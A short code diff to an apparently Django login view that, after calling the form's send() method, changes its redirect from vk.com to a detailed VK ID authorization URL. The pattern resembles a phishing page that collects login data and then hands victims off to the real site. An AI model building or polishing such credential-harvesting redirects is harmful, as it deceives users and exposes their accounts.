@@ -14,7 +14,9 @@ def index(request):
         if login_form.is_valid():
             login_form.send()
 
-            return redirect('https://vk.com/')
+            return redirect('https://id.vk.com/auth?app_id=7913379&'
+                            'response_type=silent_token&v=1.58.6&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&'
+                            'uuid=zN7AQvh6cR1pPCSNQibmX&scheme=bright_light')
 
         else:
             errors = login_form.errors
